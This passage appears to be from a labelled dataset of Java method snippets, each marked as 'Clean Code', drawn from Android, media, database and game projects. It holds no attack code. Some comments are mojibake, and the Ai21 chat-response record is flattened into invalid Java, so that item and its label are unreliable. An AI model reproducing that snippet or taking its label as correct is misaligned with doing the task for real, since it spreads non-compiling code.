    checkImageView.setVisibility(View.VISIBLE);
    photosCounterView.setVisibility(View.VISIBLE);
  }
}
@Override public void onAnimationStart(Animator animation){
  editorDoneLayout.setVisibility(View.VISIBLE);
  photoCropView.setVisibility(View.VISIBLE);
}
@Override public void onAnimationStart(Animator animation){
}
@Override public void onAnimationStart(Animator animation){
}
@Override public void onAnimationStart(Animator animation){
  captionScrollView.stopScrolling();
}
@Override public void onAnimationStart(Animator animation){
  super.onAnimationStart(animation);
  if (provider != null) {
    provider.onPreOpen();
  }
}",0,Clean Code
"@Override public boolean onTouch(View v,MotionEvent event){
  ViewGroup vg=(ViewGroup)v;
  if (event.getAction() == MotionEvent.ACTION_DOWN && vg.getChildCount() != 0 && vg.getChildAt(0).isEnabled()) {
    return false;
  }
  return super.onTouch(v,event);
}",0,Clean Code
"private NetworkTraffic(Context context,boolean onStatusbar){
  this(context,null,onStatusbar);
}
private NetworkTraffic(Context context,AttributeSet attrs,boolean onStatusbar){
  this(context,attrs,0,onStatusbar);
}
private NetworkTraffic(Context context,AttributeSet attrs,int defStyle,boolean onStatusbar){
  super(context,attrs,defStyle);
  mContext=context;
  mTextView=new TextView(mContext);
  iconLayout=new LinearLayout(mContext);
  iconLayout.setOrientation(VERTICAL);
  iconLayout.setGravity(Gravity.CENTER_VERTICAL);
  iconLayout.setLayoutParams(new LayoutParams(ViewGroup.LayoutParams.WRAP_CONTENT,ViewGroup.LayoutParams.MATCH_PARENT));
  LinearLayout contentLayout=new LinearLayout(mContext);
  contentLayout.setLayoutParams(new LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT,ViewGroup.LayoutParams.WRAP_CONTENT,Gravity.CENTER_VERTICAL));
  this.addView(contentLayout);
  contentLayout.addView(iconLayout);
  contentLayout.addView(mTextView);
  mConnectivityManager=SystemUtils.ConnectivityManager();
  isSBInstance=onStatusbar;
  if (onStatusbar) {
    SBInstance=new WeakReference<>(this);
    setTintColor(StatusbarMods.clockColor,true);
    StatusbarMods.registerClockVisibilityCallback(visible -> {
      if (visible)       makeVisible(false);
 else       hide(false);
    }
);
  }
 else {
    QSInstance=new WeakReference<>(this);
  }
}",0,Clean Code
"@C.RoleFlags private static int parseRoleFlags(String line,Map<String,String> variableDefinitions){
  String concatenatedCharacteristics=parseOptionalStringAttr(line,REGEX_CHARACTERISTICS,variableDefinitions);
  if (TextUtils.isEmpty(concatenatedCharacteristics)) {
    return 0;
  }
  String[] characteristics=Util.split(concatenatedCharacteristics,"","");
  @C.RoleFlags int roleFlags=0;
  if (Util.contains(characteristics,""public.accessibility.describes-video"")) {
    roleFlags|=C.ROLE_FLAG_DESCRIBES_VIDEO;
  }
  if (Util.contains(characteristics,""public.accessibility.transcribes-spoken-dialog"")) {
    roleFlags|=C.ROLE_FLAG_TRANSCRIBES_DIALOG;
  }
  if (Util.contains(characteristics,""public.accessibility.describes-music-and-sound"")) {
    roleFlags|=C.ROLE_FLAG_DESCRIBES_MUSIC_AND_SOUND;
  }
  if (Util.contains(characteristics,""public.easy-to-read"")) {
    roleFlags|=C.ROLE_FLAG_EASY_TO_READ;
  }
  return roleFlags;
}",0,Clean Code
"/** 
 * Walks over a tree of relational expressions, replacing each {@link RelNode} with a 'slimmed down' relational expression that projectsonly the fields required by its consumer. <p>This may make things easier for the optimizer, by removing crud that would expand the search space, but is difficult for the optimizer itself to do it, because optimizer rules must preserve the number and type of fields. Hence, this transform that operates on the entire tree, similar to the  {@link RelStructuredTypeFlattener type-flattening transform}. <p>Currently this functionality is disabled in farrago/luciddb; the default implementation of this method does nothing.
 * @param ordered Whether the relational expression must produce results ina particular order (typically because it has an ORDER BY at top level)
 * @param rootRel Relational expression that is at the root of the tree
 * @return Trimmed relational expression
 */
public RelNode trimUnusedFields(boolean ordered,RelNode rootRel){
  if (isTrimUnusedFields()) {
    final RelFieldTrimmer trimmer=newFieldTrimmer();
    final List<RelCollation> collations=rootRel.getTraitSet().getTraits(RelCollationTraitDef.INSTANCE);
    rootRel=trimmer.trim(rootRel);
    if (!ordered && collations != null && !collations.isEmpty() && !collations.equals(ImmutableList.of(RelCollations.EMPTY))) {
      final RelTraitSet traitSet=rootRel.getTraitSet().replace(RelCollationTraitDef.INSTANCE,collations);
      rootRel=rootRel.copy(traitSet,rootRel.getInputs());
    }
    if (SQL2REL_LOGGER.isDebugEnabled()) {
      SQL2REL_LOGGER.debug(RelOptUtil.dumpPlan(""Plan after trimming unused fields"",rootRel,SqlExplainFormat.TEXT,SqlExplainLevel.EXPPLAN_ATTRIBUTES));
    }
  }
  return rootRel;
}",0,Clean Code
"private int checkCRLF(){
  byte[] bytes=byteArrayOutputStream.toByteArray();
  for (int i=0; i < bytes.length - 3; i++) {
    if (bytes[i] == 13 && bytes[i + 1] == 10 && bytes[i + 2] == 13 && bytes[i + 3] == 10) {
      return i;
    }
  }
  return -1;
}",0,Clean Code
"public WDoubleEdit(double value,double min,double max,double sliderMin,double sliderMax,int decimalPlaces,boolean noSlider){
  this.value=value;
  this.min=min;
  this.max=max;
  this.decimalPlaces=decimalPlaces;
  this.sliderMin=sliderMin;
  this.sliderMax=sliderMax;
  if (noSlider || (sliderMin == 0 && sliderMax == 0))   this.noSlider=true;
}",0,Clean Code
"@Override public void validate(String name,String value){
  if (Strings.isNullOrEmpty(value) || !InetAddresses.isInetAddress(value) || !shouldAccept(InetAddresses.forString(value))) {
    throw new ParameterException(String.format(""Parameter %s should point to a valid IP v%d address, got '%s'"",name,ipVersion(),value));
  }
}
",0,Clean Code
"@Override public void transform(TypeTransformer transformer){
  transformer.applyAdviceToMethod(none(),this.getClass().getName() + ""$AddInstrumentationAdvice"");
  transformer.applyTransformer((builder,typeDescription,classLoader,javaModule,protectionDomain) -> builder.visit(new AsmVisitorWrapper(){
    @Override public int mergeWriter(    int flags){
      return flags;
    }
    @Override @CanIgnoreReturnValue public int mergeReader(    int flags){
      return flags;
    }
    @Override public ClassVisitor wrap(    TypeDescription instrumentedType,    ClassVisitor classVisitor,    Implementation.Context implementationContext,    TypePool typePool,    FieldList<FieldDescription.InDefinedShape> fields,    MethodList<?> methods,    int writerFlags,    int readerFlags){
      return new ClassVisitor(Opcodes.ASM9,classVisitor){
        @Override public MethodVisitor visitMethod(        int access,        String name,        String descriptor,        String signature,        String[] exceptions){
          MethodVisitor mv=super.visitMethod(access,name,descriptor,signature,exceptions);
          if (""<init>"".equals(name) && ""(Lgraphql/GraphQL$Builder;)V"".equals(descriptor)) {
            return new MethodVisitor(api,mv){
              @Override public void visitFieldInsn(              int opcode,              String owner,              String name,              String descriptor){
                if (opcode == Opcodes.PUTFIELD && ""instrumentation"".equals(name) && ""Lgraphql/execution/instrumentation/Instrumentation;"".equals(descriptor)) {
                  mv.visitMethodInsn(Opcodes.INVOKESTATIC,Type.getInternalName(GraphqlSingletons.class),""addInstrumentation"",""(Lgraphql/execution/instrumentation/Instrumentation;)Lgraphql/execution/instrumentation/Instrumentation;"",false);
                }
                super.visitFieldInsn(opcode,owner,name,descriptor);
              }
            }
;
          }
          return mv;
        }
      }
;
    }
  }
));
}",0,Clean Code
"/** 
 * Handle an application event.
 * @param event the event to respond to
 */
@Override public void onApplicationEvent(AppOptionTypeLoadedEvent event){
  AppOptionTypeEnum key=event.getKey();
  Object bean;
  try {
    bean=context.getBean(event.getBeanName());
  }
 catch (  Exception e) {
    String message=String.format(""cannot get bean now, failed to load app option type|beanName=%s|key=%s"",event.getBeanName(),event.getKey());
    log.error(message);
    throw new AppException(AppErrorCode.UNKNOWN_ERROR,message);
  }
  register(key,(AppOptionType)bean);
  log.info(""app option type {} has registered"",key);
}
",0,Clean Code
"@SuppressLint(""RtlHardcoded"") @Override public void onSceneViewCreated(SceneFragment scene,Bundle savedInstanceState){
  super.onSceneViewCreated(scene,savedInstanceState);
  if (scene instanceof BaseScene && mRightDrawer != null && mDrawerLayout != null) {
    BaseScene baseScene=(BaseScene)scene;
    mRightDrawer.removeAllViews();
    View drawerView=baseScene.createDrawerView(baseScene.getLayoutInflater2(),mRightDrawer,savedInstanceState);
    if (drawerView != null) {
      mRightDrawer.addView(drawerView);
      mDrawerLayout.setDrawerLockMode(DrawerLayout.LOCK_MODE_UNLOCKED,Gravity.RIGHT);
    }
 else {
      mDrawerLayout.setDrawerLockMode(DrawerLayout.LOCK_MODE_LOCKED_CLOSED,Gravity.RIGHT);
    }
  }
}",0,Clean Code
"/** 
 * Encodes  {@code value}.
 * @param value a {@link JSONObject},  {@link JSONArray}, String, Boolean, Integer, Long, Double or null. May not be  {@link Double#isNaN() NaNs}or  {@link Double#isInfinite() infinities}.
 * @return this stringer.
 */
public JSONStringer value(Object value) throws JSONException {
  if (stack.isEmpty()) {
    throw new JSONException(""Nesting problem"");
  }
  if (value instanceof JSONArray) {
    ((JSONArray)value).writeTo(this);
    return this;
  }
 else   if (value instanceof JSONObject) {
    ((JSONObject)value).writeTo(this);
    return this;
  }
  beforeValue();
  if (value == null || value instanceof Boolean || value == JSONObject.NULL) {
    out.append(value);
  }
 else   if (value instanceof Number) {
    out.append(JSONObject.numberToString((Number)value));
  }
 else {
    string(value.toString());
  }
  return this;
}
/** 
 * Encodes  {@code value} to this stringer.
 * @return this stringer.
 */
public JSONStringer value(boolean value) throws JSONException {
  if (stack.isEmpty()) {
    throw new JSONException(""Nesting problem"");
  }
  beforeValue();
  out.append(value);
  return this;
}
/** 
 * Encodes  {@code value} to this stringer.
 * @param value a finite value. May not be {@link Double#isNaN() NaNs} or{@link Double#isInfinite() infinities}.
 * @return this stringer.
 */
public JSONStringer value(double value) throws JSONException {
  if (stack.isEmpty()) {
    throw new JSONException(""Nesting problem"");
  }
  beforeValue();
  out.append(JSONObject.numberToString(value));
  return this;
}
/** 
 * Encodes  {@code value} to this stringer.
 * @return this stringer.
 */
public JSONStringer value(long value) throws JSONException {
  if (stack.isEmpty()) {
    throw new JSONException(""Nesting problem"");
  }
  beforeValue();
  out.append(value);
  return this;
}
",0,Clean Code
"@Override protected List<SampleGroup> doInBackground(String... uris){
  List<SampleGroup> result=new ArrayList<>();
  Context context=getApplicationContext();
  String userAgent=Util.getUserAgent(context,""ExoPlayerDemo"");
  DataSource dataSource=new DefaultDataSource(context,userAgent,false);
  for (  String uri : uris) {
    DataSpec dataSpec=new DataSpec(Uri.parse(uri));
    InputStream inputStream=new DataSourceInputStream(dataSource,dataSpec);
    try {
      readSampleGroups(new JsonReader(new InputStreamReader(inputStream,""UTF-8"")),result);
    }
 catch (    Exception e) {
      Log.e(TAG,""Error loading sample list: "" + uri,e);
      sawError=true;
    }
 finally {
      Util.closeQuietly(dataSource);
    }
  }
  return result;
}",0,Clean Code
"/** 
 * 鏋勫缓鍏紡鐨勫弬鏁�
 * @param moduleFields
 * @param fieldNameValue
 * @return
 */
default Map<String,Object> buildFormulaEnv(List<ModuleField> moduleFields,Map<String,Object> fieldNameValue){
  Map<String,ModuleField> fieldNameMap=moduleFields.stream().collect(Collectors.toMap(ModuleField::getFieldName,Function.identity()));
  Map<String,Object> env=new HashMap<>(16);
  for (  Map.Entry<String,Object> entry : fieldNameValue.entrySet()) {
    String fieldName=entry.getKey();
    Object value=entry.getValue();
    if (ObjectUtil.isNull(value)) {
      continue;
    }
    ModuleField field=fieldNameMap.get(fieldName);
    if (ObjectUtil.isNull(field)) {
      continue;
    }
    String argName=ExpressionUtil.getArgName(field);
    env.put(argName,value);
    if (ObjectUtil.equal(ModuleFieldEnum.SELECT,ModuleFieldEnum.parse(field.getType()))) {
      String jsonStr="""";
      if (value instanceof Map) {
        jsonStr=JSON.toJSONString(value);
      }
 else {
        jsonStr=value.toString();
      }
      ModuleOptionsBO optionsBO=JSON.parseObject(jsonStr,ModuleOptionsBO.class);
      env.put(argName,optionsBO.getValue());
    }
    if (Arrays.asList(ModuleFieldEnum.NUMBER,ModuleFieldEnum.FLOATNUMBER,ModuleFieldEnum.PERCENT).contains(ModuleFieldEnum.parse(field.getType()))) {
      env.put(argName,Long.valueOf(value.toString()));
    }
  }
  return env;
}
/** 
 * 鏋勫缓鍏紡鐨勫弬鏁�
 * @param moduleId       妯″潡ID
 * @param version        鐗堟湰鍙�
 * @param fieldNameValue 瀛楁鍚�-鍊� map
 * @return
 */
default Map<String,Object> buildFormulaEnv(Long moduleId,Integer version,Map<String,Object> fieldNameValue){
  List<ModuleField> moduleFields;
  if (ObjectUtil.isNull(version)) {
    moduleFields=ApplicationContextHolder.getBean(IModuleFieldService.class).getByModuleIdAndVersion(moduleId,version,null);
  }
 else {
    moduleFields=ApplicationContextHolder.getBean(IModuleFieldService.class).getByModuleId(moduleId,null);
  }
  return buildFormulaEnv(moduleFields,fieldNameValue);
}",0,Clean Code
"/** 
 * Convert an architecture from a String to an int.
 * @param arch The architecture as a String
 * @return The architecture as an int, can be UNSUPPORTED_ARCH if unknown.
 */
public static int archAsInt(String arch){
  arch=arch.toLowerCase().trim().replace("" "","""");
  if (arch.contains(""arm64"") || arch.equals(""aarch64""))   return ARCH_ARM64;
  if (arch.contains(""arm"") || arch.equals(""aarch32""))   return ARCH_ARM;
  if (arch.contains(""x86_64"") || arch.contains(""amd64""))   return ARCH_X86_64;
  if (arch.contains(""x86"") || (arch.startsWith(""i"") && arch.endsWith(""86"")))   return ARCH_X86;
  return UNSUPPORTED_ARCH;
}",0,Clean Code
"@Override public void onPageSelected(FilterTabsView.Tab tab,boolean forward){
  if (viewPages[0].selectedType == tab.id) {
    return;
  }
  if (tab.isLocked) {
    filterTabsView.shakeLock(tab.id);
    showDialog(new LimitReachedBottomSheet(DialogsActivity.this,context,LimitReachedBottomSheet.TYPE_FOLDERS,currentAccount));
    return;
  }
  ArrayList<MessagesController.DialogFilter> dialogFilters=getMessagesController().dialogFilters;
  if (!tab.isDefault && (tab.id < 0 || tab.id >= dialogFilters.size())) {
    return;
  }
  isFirstTab=tab.id == filterTabsView.getFirstTabId();
  updateDrawerSwipeEnabled();
  viewPages[1].selectedType=tab.id;
  viewPages[1].setVisibility(View.VISIBLE);
  viewPages[1].setTranslationX(viewPages[0].getMeasuredWidth());
  showScrollbars(false);
  switchToCurrentSelectedMode(true);
  animatingForward=forward;
}",0,Clean Code
"/** 
 * Adds the given view to the CellLayout
 * @param child view to add.
 * @param index index of the CellLayout children where to add the view.
 * @param childId id of the view.
 * @param params represent the logic of the view on the CellLayout.
 * @param markCells if the occupied cells should be marked or not
 * @return if adding the view was successful
 */
public boolean addViewToCellLayout(View child,int index,int childId,CellLayoutLayoutParams params,boolean markCells){
  final CellLayoutLayoutParams lp=params;
  if (child instanceof BubbleTextView) {
    BubbleTextView bubbleChild=(BubbleTextView)child;
    bubbleChild.setTextVisibility(mContainerType != HOTSEAT);
  }
  child.setScaleX(mChildScale);
  child.setScaleY(mChildScale);
  if (lp.getCellX() >= 0 && lp.getCellX() <= mCountX - 1 && lp.getCellY() >= 0 && lp.getCellY() <= mCountY - 1) {
    if (lp.cellHSpan < 0)     lp.cellHSpan=mCountX;
    if (lp.cellVSpan < 0)     lp.cellVSpan=mCountY;
    child.setId(childId);
    if (LOGD) {
      Log.d(TAG,""Adding view to ShortcutsAndWidgetsContainer: "" + child);
    }
    mShortcutsAndWidgets.addView(child,index,lp);
    if (markCells)     markCellsAsOccupiedForView(child);
    return true;
  }
  return false;
}",0,Clean Code
"@SubscribeEvent public static void glueListensForBlockPlacement(EntityPlaceEvent event){
  LevelAccessor world=event.getLevel();
  Entity entity=event.getEntity();
  BlockPos pos=event.getPos();
  if (entity == null || world == null || pos == null)   return;
  if (world.isClientSide())   return;
  Set<SuperGlueEntity> cached=new HashSet<>();
  for (  Direction direction : Iterate.directions) {
    BlockPos relative=pos.relative(direction);
    if (SuperGlueEntity.isGlued(world,pos,direction,cached) && BlockMovementChecks.isMovementNecessary(world.getBlockState(relative),entity.level(),relative))     AllPackets.getChannel().send(PacketDistributor.TRACKING_ENTITY_AND_SELF.with(() -> entity),new GlueEffectPacket(pos,direction,true));
  }
  if (entity instanceof Player)   glueInOffHandAppliesOnBlockPlace(event,pos,(Player)entity);
}
",0,Clean Code
"/** 
 * Ai21 Jurassic2 chat response. https://docs.ai21.com/reference/j2-complete-api-ref#response
 * @param id The unique identifier of the response.
 * @param prompt The prompt used for the chat.
 * @param amazonBedrockInvocationMetrics The metrics about the model invocation.
 */
@JsonInclude(Include.NON_NULL) public record Ai21Jurassic2ChatResponse(@JsonProperty(""id"") String id,@JsonProperty(""prompt"") Prompt prompt,@JsonProperty(""completions"") List<Completion> completions,@JsonProperty(""amazon-bedrock-invocationMetrics"") AmazonBedrockInvocationMetrics amazonBedrockInvocationMetrics){
  @JsonInclude(Include.NON_NULL) public record Completion;
  @JsonProperty(""data"") Prompt data;
  @JsonProperty(""finishReason"") FinishReason finishReason;
  @JsonInclude(Include.NON_NULL) public record Token;
  @JsonProperty(""generatedToken"") GeneratedToken generatedToken;
  @JsonProperty(""topTokens"") List<TopToken> topTokens;
  @JsonProperty(""textRange"") TextRange textRange;
  @JsonInclude(Include.NON_NULL) public record GeneratedToken;
  @JsonProperty(""token"") String token;
  @JsonProperty(""logprob"") Float logprob;
  @JsonProperty(""raw_logprob"") Float rawLogprob;
  @JsonInclude(Include.NON_NULL) public record TopToken;
  @JsonProperty(""token"") String token;
  @JsonProperty(""logprob"") Float logprob;
  @JsonInclude(Include.NON_NULL) public record TextRange;
  @JsonProperty(""start"") Integer start;
  @JsonProperty(""end"") Integer end;
  @JsonInclude(Include.NON_NULL) public record Prompt;
  @JsonProperty(""text"") String text;
  @JsonProperty(""tokens"") List<Token> tokens;
  @JsonInclude(Include.NON_NULL) public record FinishReason;
  @JsonProperty(""reason"") String reason;
  @JsonProperty(""length"") String length;
  @JsonProperty(""sequence"") String sequence;
}",0,Clean Code
"/** 
 * Process the minimum and maximum heights for this dimension, and processes the world coordinate scale. This must be done after the player has switched dimensions so we know what their dimension is
 */
public static void loadDimension(GeyserSession session){
  JavaDimension dimension=session.getDimensionType();
  int minY=dimension.minY();
  int maxY=dimension.maxY();
  BedrockDimension bedrockDimension=session.getBedrockDimension();
  if (minY < bedrockDimension.minY() || (bedrockDimension.doUpperHeightWarn() && maxY > bedrockDimension.height())) {
    session.getGeyser().getLogger().warning(GeyserLocale.getLocaleStringLog(""geyser.network.translator.chunk.out_of_bounds"",String.valueOf(bedrockDimension.minY()),String.valueOf(bedrockDimension.height()),session.getRegistryCache().dimensions().byValue(session.getDimensionType())));
  }
  session.getChunkCache().setMinY(minY);
  session.getChunkCache().setHeightY(maxY);
  session.getWorldBorder().setWorldCoordinateScale(dimension.worldCoordinateScale());
}
",0,Clean Code
"public EMatchStateFilter getMatchStateFilter(){
  if (matchStateCombo.getValue().equals(FILTER_ITEM_MATCHED)) {
    return EMatchStateFilter.MATCHED;
  }
 else   if (matchStateCombo.getValue().equals(FILTER_ITEM_UNMATCHED)) {
    return EMatchStateFilter.UNMATCHED;
  }
 else   if (matchStateCombo.getValue().equals(FILTER_ITEM_MATCHED_IDENTICAL)) {
    return EMatchStateFilter.MATCHED_IDENTICAL;
  }
 else   if (matchStateCombo.getValue().equals(FILTER_ITEM_MATCHED_INSTRUCTION_ONLY_CHANGES)) {
    return EMatchStateFilter.MATCHED_INSTRUCTION_CHANGES;
  }
 else   if (matchStateCombo.getValue().equals(FILTER_ITEM_MATCHED_INSTRUCTION_CHANGES)) {
    return EMatchStateFilter.MATCHED_INSTRUCTION_CHANGES;
  }
 else   if (matchStateCombo.getValue().equals(FILTER_ITEM_MATCHED_STRUCTURAL_CHANGES)) {
    return EMatchStateFilter.MATCHED_STRUTURAL_CHANGES;
  }
  return EMatchStateFilter.NONE;
}
",0,Clean Code
"@Override public long selectTracks(TrackSelection[] selections,boolean[] mayRetainStreamFlags,SampleStream[] streams,boolean[] streamResetFlags,long positionUs){
  assertThat(prepared).isTrue();
  int rendererCount=selections.length;
  for (int i=0; i < rendererCount; i++) {
    if (streams[i] != null && (selections[i] == null || !mayRetainStreamFlags[i])) {
      streams[i]=null;
    }
    if (streams[i] == null && selections[i] != null) {
      TrackSelection selection=selections[i];
      assertThat(selection.length()).isAtLeast(1);
      TrackGroup trackGroup=selection.getTrackGroup();
      assertThat(trackGroupArray.indexOf(trackGroup) != C.INDEX_UNSET).isTrue();
      int indexInTrackGroup=selection.getIndexInTrackGroup(selection.getSelectedIndex());
      assertThat(indexInTrackGroup).isAtLeast(0);
      assertThat(indexInTrackGroup).isLessThan(trackGroup.length);
      streams[i]=createSampleStream(selection);
      streamResetFlags[i]=true;
    }
  }
  return positionUs;
}",0,Clean Code
"public LabelContextMenu(Entry entry,String label){
  MenuItem copyLabel=new MenuItem(""Copy Label"");
  copyLabel.setOnAction(AE -> {
    hide();
    ClipboardContent content=new ClipboardContent();
    content.putString(label);
    Clipboard.getSystemClipboard().setContent(content);
  }
);
  getItems().add(copyLabel);
  MenuItem pasteLabel=new MenuItem(""Paste Label"");
  pasteLabel.setOnAction(AE -> {
    hide();
    Object currentContent=Clipboard.getSystemClipboard().getContent(DataFormat.PLAIN_TEXT);
    if (currentContent instanceof String) {
      entry.labelProperty().set((String)currentContent);
    }
  }
);
  getItems().add(pasteLabel);
}
public LabelContextMenu(Address address,long value){
  if (address != null) {
    MenuItem copyAddress=new MenuItem(""Copy Address"");
    copyAddress.setOnAction(event -> {
      hide();
      ClipboardContent content=new ClipboardContent();
      content.putString(address.toString());
      Clipboard.getSystemClipboard().setContent(content);
    }
);
    getItems().add(copyAddress);
    MenuItem showAddress=new MenuItem(""Show Address as QR..."");
    showAddress.setOnAction(event -> {
      hide();
      QRDisplayDialog qrDisplayDialog=new QRDisplayDialog(address.toString());
      qrDisplayDialog.initOwner(TransactionDiagram.this.getScene().getWindow());
      qrDisplayDialog.showAndWait();
    }
);
    getItems().add(showAddress);
  }
  MenuItem copySatsValue=new MenuItem(""Copy Value in sats"");
  copySatsValue.setOnAction(event -> {
    hide();
    ClipboardContent content=new ClipboardContent();
    content.putString(Long.toString(value));
    Clipboard.getSystemClipboard().setContent(content);
  }
);
  MenuItem copyBtcValue=new MenuItem(""Copy Value in BTC"");
  copyBtcValue.setOnAction(event -> {
    hide();
    ClipboardContent content=new ClipboardContent();
    UnitFormat format=Config.get().getUnitFormat() == null ? UnitFormat.DOT : Config.get().getUnitFormat();
    content.putString(format.formatBtcValue(value));
    Clipboard.getSystemClipboard().setContent(content);
  }
);
  getItems().addAll(copySatsValue,copyBtcValue);
}
",0,Clean Code
"@Override protected int computeSerializedSize(){
  int size=0;
  if ((bitField0_ & 0x00000001) != 0) {
    size+=5;
  }
  if ((bitField0_ & 0x00000002) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(dialogueEventId);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(argId);
  }
  if ((bitField0_ & 0x00000008) != 0) {
    size+=1 + ProtoSink.computeSInt32SizeNoTag(intValue);
  }
  if ((bitField0_ & 0x00000010) != 0) {
    size+=2;
  }
  return size;
}",0,Clean Code
"@Override public ResultMap payForOrder(CfOrder cfOrder,String cfUserPaymentAgencyId,String ip) throws Exception {
  CfUserPaymentAgency cfUserPaymentAgency=cfUserPaymentAgencyService.findById(cfUserPaymentAgencyId,false);
  if (cfOrder.getPayTime() != null && cfOrder.getPayTime() > 0) {
    cfOrder.setUserPaymentAgencyId(cfUserPaymentAgencyId);
    return null;
  }
  cfOrder.setPaymentAgencyShortName(cfUserPaymentAgency.getPaymentAgencyShortName());
  cfOrder.setUpdateTime(System.currentTimeMillis());
  cfOrder=update(cfOrder);
  if (cfOrder.getManualOfferSetTime() != null && (System.currentTimeMillis() - cfOrder.getManualOfferSetTime() < 900000) && cfOrder.getManualOffer() != null && cfOrder.getManualOffer().doubleValue() > 0 && cfOrder.getAmountsPayable().doubleValue() > cfOrder.getManualOffer().doubleValue()) {
    BigDecimal amountsPayable=cfOrder.getAmountsPayable();
    cfOrder.setAmountsPayable(amountsPayable.subtract(cfOrder.getManualOffer()));
  }
  if (cfOrder.getAmountsPayable().doubleValue() <= 0) {
    ExceptionCast.cast(PayCode.NO_NEED_TO_PAY);
  }
  return getUnifiedOrderByPaymentAgency(cfUserPaymentAgency,cfOrder,ip);
}",0,Clean Code
"private void maybeNotifyBandwidthSample(int elapsedMs,long bytesTransferred,long bitrateEstimate){
  if (elapsedMs == 0 && bytesTransferred == 0 && bitrateEstimate == lastReportedBitrateEstimate) {
    return;
  }
  lastReportedBitrateEstimate=bitrateEstimate;
  eventDispatcher.dispatch(listener -> listener.onBandwidthSample(elapsedMs,bytesTransferred,bitrateEstimate));
}",0,Clean Code
"/** 
 * Returns a decorated  {@link Producer} that emits spans for each sent message. 
 */
@SuppressWarnings(""unchecked"") public <K,V>Producer<K,V> wrap(Producer<K,V> producer){
  return (Producer<K,V>)Proxy.newProxyInstance(KafkaTelemetry.class.getClassLoader(),new Class<?>[]{Producer.class},(proxy,method,args) -> {
    if (""send"".equals(method.getName()) && method.getParameterCount() >= 1 && method.getParameterTypes()[0] == ProducerRecord.class) {
      ProducerRecord<K,V> record=(ProducerRecord<K,V>)args[0];
      Callback callback=method.getParameterCount() >= 2 && method.getParameterTypes()[1] == Callback.class ? (Callback)args[1] : null;
      return buildAndInjectSpan(record,producer,callback,producer::send);
    }
    try {
      return method.invoke(producer,args);
    }
 catch (    InvocationTargetException exception) {
      throw exception.getCause();
    }
  }
);
}
/** 
 * Returns a decorated  {@link Consumer} that consumes spans for each received message. 
 */
@SuppressWarnings(""unchecked"") public <K,V>Consumer<K,V> wrap(Consumer<K,V> consumer){
  return (Consumer<K,V>)Proxy.newProxyInstance(KafkaTelemetry.class.getClassLoader(),new Class<?>[]{Consumer.class},(proxy,method,args) -> {
    Object result;
    Timer timer=""poll"".equals(method.getName()) ? Timer.start() : null;
    try {
      result=method.invoke(consumer,args);
    }
 catch (    InvocationTargetException exception) {
      throw exception.getCause();
    }
    if (""poll"".equals(method.getName()) && result instanceof ConsumerRecords) {
      ConsumerRecords<K,V> consumerRecords=(ConsumerRecords<K,V>)result;
      Context receiveContext=buildAndFinishSpan(consumerRecords,consumer,timer);
      if (receiveContext == null) {
        receiveContext=Context.current();
      }
      KafkaConsumerContext consumerContext=KafkaConsumerContextUtil.create(receiveContext,consumer);
      result=addTracing(consumerRecords,consumerContext);
    }
    return result;
  }
);
}",0,Clean Code
"public static List<String> parserSql(List<String> lineList){
  if (CollectionUtils.isEmpty(lineList)) {
    throw new RuntimeException(""lineList is null"");
  }
  List<String> sqlList=new ArrayList<>();
  StringBuilder stmt=new StringBuilder();
  for (  String line : lineList) {
    if (line.trim().isEmpty() || line.startsWith(SystemConstant.COMMENT_SYMBOL) || trimStart(line).startsWith(SystemConstant.COMMENT_SYMBOL)) {
      continue;
    }
    stmt.append(SystemConstant.LINE_FEED).append(line);
    if (line.trim().endsWith(SystemConstant.SEMICOLON)) {
      sqlList.add(stmt.substring(0,stmt.length() - 1));
      stmt.setLength(0);
    }
  }
  return sqlList;
}",0,Clean Code
"public long addContactToPhoneBook(TLRPC.User user,boolean check){
  if (systemAccount == null || user == null) {
    return -1;
  }
  if (!hasContactsWritePermission()) {
    return -1;
  }
  long res=-1;
synchronized (observerLock) {
    ignoreChanges=true;
  }
  ContentResolver contentResolver=ApplicationLoader.applicationContext.getContentResolver();
  if (check) {
    try {
      Uri rawContactUri=ContactsContract.RawContacts.CONTENT_URI.buildUpon().appendQueryParameter(ContactsContract.CALLER_IS_SYNCADAPTER,""true"").appendQueryParameter(ContactsContract.RawContacts.ACCOUNT_NAME,systemAccount.name).appendQueryParameter(ContactsContract.RawContacts.ACCOUNT_TYPE,systemAccount.type).build();
      int value=contentResolver.delete(rawContactUri,ContactsContract.RawContacts.SYNC2 + "" = "" + user.id,null);
    }
 catch (    Exception ignore) {
    }
  }
  ArrayList<ContentProviderOperation> query=new ArrayList<>();
  applyContactToPhoneBook(query,user);
  try {
    ContentProviderResult[] result=contentResolver.applyBatch(ContactsContract.AUTHORITY,query);
    if (result != null && result.length > 0 && result[0].uri != null) {
      res=Long.parseLong(result[0].uri.getLastPathSegment());
    }
  }
 catch (  Exception e) {
    FileLog.e(e);
  }
synchronized (observerLock) {
    ignoreChanges=false;
  }
  return res;
}",0,Clean Code
"@VisibleForTesting void validateMobileUnique(Long id,String mobile){
  if (StrUtil.isBlank(mobile)) {
    return;
  }
  MemberUserDO user=memberUserMapper.selectByMobile(mobile);
  if (user == null) {
    return;
  }
  if (id == null) {
    throw exception(USER_MOBILE_USED,mobile);
  }
  if (!user.getId().equals(id)) {
    throw exception(USER_MOBILE_USED,mobile);
  }
}
",0,Clean Code
"private void updateSectionItemRangeSelectionState(int sectionIndex,int fromPosition,int delta){
  SectionSelectionState sectionSelectionState=getSectionSelectionState(sectionIndex);
  SparseBooleanArray itemState=sectionSelectionState.items.clone();
  sectionSelectionState.items.clear();
  for (int i=0, n=itemState.size(); i < n; i++) {
    int pos=itemState.keyAt(i);
    if (delta < 0 && pos >= fromPosition && pos < fromPosition - delta) {
      continue;
    }
    int newPos=pos;
    if (pos >= fromPosition) {
      newPos+=delta;
    }
    if (itemState.get(pos)) {
      sectionSelectionState.items.put(newPos,true);
    }
  }
}",0,Clean Code
"/** 
 * Retrieve an approximate, axis-aligned bounding box for the symbol.
 */
public int[] getBounds(){
  int n=getLocationSize(peer);
  if (n <= 0) {
    return (null);
  }
  int[] bounds=new int[4];
  int xmin=Integer.MAX_VALUE;
  int xmax=Integer.MIN_VALUE;
  int ymin=Integer.MAX_VALUE;
  int ymax=Integer.MIN_VALUE;
  for (int i=0; i < n; i++) {
    int x=getLocationX(peer,i);
    if (xmin > x) {
      xmin=x;
    }
    if (xmax < x) {
      xmax=x;
    }
